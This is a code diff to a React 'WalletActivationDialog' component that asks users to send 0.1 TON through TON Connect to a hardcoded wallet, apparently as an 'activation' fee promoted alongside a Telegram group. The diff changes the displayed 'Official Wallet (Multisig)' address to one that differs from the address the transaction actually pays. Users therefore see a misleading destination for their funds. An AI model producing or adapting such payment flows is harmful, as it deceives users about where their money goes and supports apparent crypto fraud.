@@ -43,9 +43,7 @@ export function WalletActivationDialog({ lang }: WalletActivationDialogProps) {
   const [loading, setLoading] = useState(false);
   const [guide, setGuide] = useState<WalletActivationOutput | null>(null);
   
-  // Configuración de transacción corregida
   const DESTINATION_WALLET = "UQCx6O7-7_Cdp6tgZI21h3EBbOAU0lOFQS4z_CHRyy-oOn0i";
-  const AMOUNT_NANOTONS = "100000000"; // 0.1 TON para pruebas (debe ser string)
   const TELEGRAM_COMMUNITY_LINK = "https://t.me/+chwJbbIptpdhNDc8";
 
   useEffect(() => {
@@ -120,14 +118,12 @@ export function WalletActivationDialog({ lang }: WalletActivationDialogProps) {
       return;
     }
 
-    // Estructura de transacción corregida para evitar [TON_CONNECT_SDK_ERROR] Payload is invalid
     const transaction = {
-      validUntil: Math.floor(Date.now() / 1000) + 300, // 5 minutos de validez
+      validUntil: Math.floor(Date.now() / 1000) + 600,
       messages: [
         {
           address: DESTINATION_WALLET,
-          amount: AMOUNT_NANOTONS, // Valor en nanotons como string
-          bounce: false,
+          amount: (0.1 * 1e9).toString(),
         }
       ]
     };
@@ -259,7 +255,7 @@ export function WalletActivationDialog({ lang }: WalletActivationDialogProps) {
         </div>
         
         <div className="text-[9px] text-center text-muted-foreground/60 px-4 break-all mt-4 border-t pt-4">
-          Wallet Oficial (Multisig): {DESTINATION_WALLET}
+          Wallet Oficial (Multisig): EQDyaPfKJD5Om5Nx9-3uOT7SKiOkiLG_4rkOLO3BZqYEGMO7
         </div>
       </DialogContent>
     </Dialog>
